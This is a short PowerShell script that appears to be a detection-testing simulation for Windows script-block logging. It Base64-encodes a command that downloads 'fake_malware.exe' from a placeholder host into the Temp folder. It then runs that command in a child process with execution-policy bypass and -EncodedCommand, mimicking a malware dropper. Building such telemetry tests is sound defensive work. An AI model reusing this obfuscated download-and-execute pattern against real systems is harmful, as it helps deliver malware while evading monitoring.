# ==============================================================================
# Description: Generates obfuscated & suspicious PowerShell execution telemetry
# ==============================================================================

Write-Host "[+] Preparing suspicious payload simulation..." -ForegroundColor Cyan

# 1. Raw suspicious command string (simulating an adversary attempting payload download)
$RawPayload = "Write-Host 'ALERT: Suspicious payload executed!'; Invoke-WebRequest -Uri 'http://example.com/fake_malware.exe' -OutFile 'C:\Windows\Temp\test.exe'"

# 2. Convert string to Unicode bytes, then to Base64 (Standard technique used by malware droppers)
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($RawPayload)
$EncodedPayload = [Convert]::ToBase64String($Bytes)

Write-Host "[*] Encoded Payload: $EncodedPayload" -ForegroundColor Yellow

# 3. Spawn a child powershell process executing the encoded payload
Write-Host "[*] Spawning child process with -EncodedCommand parameter..." -ForegroundColor Yellow
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $EncodedPayload" -NoNewWindow -Wait

Write-Host "[+] Obfuscated execution test complete! Windows has logged Event ID 4104." -ForegroundColor Green